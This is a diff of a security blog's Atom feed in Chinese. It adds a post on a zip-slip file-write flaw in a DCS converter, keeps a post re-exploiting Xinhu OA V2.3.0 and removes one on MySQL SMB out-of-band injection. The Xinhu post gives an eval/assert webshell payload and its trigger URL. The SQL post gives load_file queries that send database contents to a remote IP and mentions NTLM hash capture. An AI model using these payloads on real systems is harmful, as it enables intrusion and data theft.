@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-10-18T14:09:14.142Z</updated>
+  <updated>2021-12-05T01:17:30.475Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -17,11 +17,31 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>某DCS zip Slip任意写文件漏洞</title>
+    <link href="http://422926799.github.io/posts/d1787975.html"/>
+    <id>http://422926799.github.io/posts/d1787975.html</id>
+    <published>2021-12-05T00:53:20.000Z</published>
+    <updated>2021-12-05T01:17:30.475Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hw的时候遇到的，结束后复现找了一下漏洞代码<br><img src="https://i.bmp.ovh/imgs/2021/12/1ec77b267b96fd4d.png" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>漏洞url:</p><pre><code>/dcs.web/upload?convertType=19&amp;isSourceDir=0</code></pre><p>文档说明<br><img src="https://s4.ax1x.com/2021/12/05/oBnmE8.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnu4g.png" alt=""></p><p>upload处理点<br><img src="https://s4.ax1x.com/2021/12/05/oBnQ3j.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBn1vn.png" alt=""></p><p>config.inputDir.getPath()获取config.properties里的dir.input，然后设置了三个属性值:</p><pre><code>* fname - 文件名* finput - 文件上传后的路径* sourceRelativepath - 生成的UUID</code></pre><p><img src="https://s4.ax1x.com/2021/12/05/oBnw8J.png" alt=""></p><p>文件写入到input目录后，返回json请求/convert进行处理<br>首先调用buildParam函数进行处理<br><img src="https://s4.ax1x.com/2021/12/05/oBnyb6.png" alt=""></p><p>获取convertType参数，然后转换成int类型。传入EnumConvertType.getEnum判断值是否存在hash表里<br><img src="https://s4.ax1x.com/2021/12/05/oBncVK.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBn25D.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnh2d.png" alt=""></p><p>经过获取一些请求参数后，然后来到 String lowrealInput = realInput.toLowerCase()<br><img src="https://s4.ax1x.com/2021/12/05/oBn4xA.png" alt=""></p><p>往上跟踪发现取finput属性，获取inputDir，outputDir，zipFileName，zipOutput请求参数。然后进行判断，由于请求都没有带到这些参数所以去到finput<br><img src="https://s4.ax1x.com/2021/12/05/oBnort.png" alt=""></p><p>然后进入大判断，判断lowrealInput尾部是否存在对应的后缀，并将EnumConvertType设置为对应的hash表key<br><img src="https://s4.ax1x.com/2021/12/05/oBnHVf.png" alt=""></p><p>然后去到284行，获取fname，fileName属性的值。判断fileName不为空调用setFIleName函数。设置this.fileName,然后获取compressedSuffix请求参数，最后判断enumType不为空调用updateFilePath函数<br><img src="https://s4.ax1x.com/2021/12/05/oBnqIS.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnXGQ.png" alt=""></p><p>updateFilePath函数<br><img src="https://s4.ax1x.com/2021/12/05/oBnj2j.png" alt=""></p><p>后面就是对一些请求参数转int进行设置<br><img src="https://s4.ax1x.com/2021/12/05/oBnvxs.png" alt=""></p><p>回到ConvertParamBuilder.class，经过checkParam函数判断是不是pdf，然后单独开个线程处理然后生成json调用getJsonResult函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuiIU.png" alt=""></p><p>getJsonResult函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuAG4.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBuVz9.png" alt=""></p><p>getResultDate函数生成返回的url<br><img src="https://s4.ax1x.com/2021/12/05/oBueMR.png" alt=""></p><p>ZipService.zipfile函数，先获取tmpDir目录然后调用copyDirectiory函数将input目录下上传的文件copy到out目录。最后调用zip函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuKZ6.png" alt=""></p><p>zip函数如下<br><img src="https://s4.ax1x.com/2021/12/05/oBuQIO.png" alt=""></p><p>zip函数<br><img src="https://s4.ax1x.com/2021/12/05/oBu3Je.png" alt=""></p><p>引用一张图<br><img src="https://s4.ax1x.com/2021/12/05/oBuYQA.png" alt=""></p><p>参考链接:<a href="https://saucer-man.com/information_security/364.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/364.html</a></p><p><img src="https://s4.ax1x.com/2021/12/05/oButsI.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBucyn.png" alt=""></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;hw的时候遇到的，结束后复现找了一下漏洞代码&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/12/1ec</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>信呼OA V2.3.0 治标不治本的配置文件getshell重新利用</title>
     <link href="http://422926799.github.io/posts/3541f020.html"/>
     <id>http://422926799.github.io/posts/3541f020.html</id>
     <published>2021-10-18T13:56:13.000Z</published>
-    <updated>2021-10-18T14:09:14.142Z</updated>
+    <updated>2021-10-18T14:09:23.686Z</updated>
     
     <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接：<a href="https://www.freebuf.com/articles/web/286380.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/286380.html</a><br>最近打点的时候遇见个信呼OA，用的上述的<code>后台配置文件getshell</code>方法成过getshell<br>原本打算复现一下的，后面一看版本最新的。。。<br>(后面重新看了一下，发现修复不严谨。在后台用户重命名处修改即可重新利用)<br><img src="https://z3.ax1x.com/2021/10/18/5a8IFH.png" alt=""></p><h2 id="代码跟踪"><a href="#代码跟踪" class="headerlink" title="代码跟踪"></a>代码跟踪</h2><p>在V2.2.8的时候报出一处update拼接管理员名的注入+配置文件插入管理员修改config文件的信息<br>之前的payload利用：</p><pre><code>http://127.0.0.1/index.php?a=changestyle&amp;m=geren&amp;d=system&amp;ajaxbool=true&amp;style=21,id=1,name=0x610A6576616C28245F504F53545B315D293B2F2Fhttp://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961a:函数名称m:类名称d:处理文件文件夹父路径名称</code></pre><p>路由分析<br><img src="https://z3.ax1x.com/2021/10/18/5aGa9A.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aGrB8.png" alt=""></p><p>以前的漏洞点分析:<br>gerenClassAction函数更新管理员信息的点<br><img src="https://z3.ax1x.com/2021/10/18/5aGghj.png" alt=""></p><p>在V2.3.0后，int强转只取第一个参数的值<br>（一开始没看仔细还以为那里做了过滤，后面更了post也没发现那里不对。最好才看见这个int）<br><img src="https://z3.ax1x.com/2021/10/18/5aGHN4.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJ9ED.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJeDf.png" alt=""></p><p>但是saveCongAjax函数没任何变化<br><img src="https://z3.ax1x.com/2021/10/18/5aJlCj.png" alt=""></p><p>直接利用后台的用户改名功能重命名管理员的名称，在rockClass.php新建了函数过滤，eval被砍了。直接用assert代替即可<br><img src="https://z3.ax1x.com/2021/10/18/5aJUVU.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJ0PJ.png" alt=""></p><h2 id="死灰复燃"><a href="#死灰复燃" class="headerlink" title="死灰复燃"></a>死灰复燃</h2><p>用户管理处修改当前登录管理的姓名为:<code>\rassert($_POST[1]);//</code><br><img src="https://z3.ax1x.com/2021/10/18/5aJIxI.png" alt=""></p><p>访问<a href="http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961" target="_blank" rel="noopener">http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961</a> 即可<br><img src="https://z3.ax1x.com/2021/10/18/5aJOIg.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aYiZT.png" alt=""></p>]]></content>
     
@@ -444,30 +464,6 @@
     
     
     <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>mysql smb外带注入</title>
-    <link href="http://422926799.github.io/posts/af61cc76.html"/>
-    <id>http://422926799.github.io/posts/af61cc76.html</id>
-    <published>2021-06-29T14:19:23.000Z</published>
-    <updated>2021-06-29T14:28:09.743Z</updated>
-    
-    <content type="html"><![CDATA[<p>需求：secure_file_priv为空，目标系统为windows<br>smb设置如下：</p><pre><code>找到 security = user ， 旧版本将user 改为share，这里我用的新版本，需要在后面添加：map to guest = Bad User新设置一个smbsmb日志:/var/log/samba</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuE9S.png" alt=""></p><p>smb外带注入与DNS外带注入比较:</p><ol><li>smb外带注入 可以一次性提交更大长度的字符，经测试长度在120是没有问题的，而dns前缀最多是63个字符。而且对特殊字符的兼容性比较好，目前测试发现 *是不行的，其他还有待fuzz。</li><li>smb外带注入不依赖于dns，可以绕过目前流量监测设备对异常域名前缀的捕获，可以直接使用ip，不需要dns请求。</li></ol><p>构造sql语句：</p><pre><code>select load_file(concat(&quot;\\\\&lt;IP&gt;\\&quot;,(SQL语句),&quot;\\xxx&quot;))为了方便从log里提取查询的内容，可以构造如下语句select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,database(),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuJc4.png" alt=""></p><p>查询当前数据库里的表</p><pre><code>1. 使用limit2. substring截断</code></pre><p>使用limit请先获取总共的表数</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select count(table_name) from information_schema.tables where table_schema=database()),&quot;]\\1.txt&quot;));</code></pre><p>再用limit逐个查询</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKS8U.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/29/RwKp2F.png" alt=""></p><p>substring截断<br>截断到120字符串即可</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,120)),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKAV1.png" alt=""></p><p>还有另外种方法就是利用smb获取ntlm hash，适用于知道目标一定的凭证。利用responder获取ntlm v2然后爆破<br><img src="https://z3.ax1x.com/2021/06/29/RwKUxg.png" alt=""></p><p>参考链接:<a href="http://moonslow.com/article/smb_sql_injection" target="_blank" rel="noopener">http://moonslow.com/article/smb_sql_injection</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;需求：secure_file_priv为空，目标系统为windows&lt;br&gt;smb设置如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;找到 security = user ， 旧版本将user 改为share，这里我用的新版本，需要在后面添加：
-map to guest = Bad </summary>
-      
-    
-    
-    
-    
-    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
     
   </entry>
   
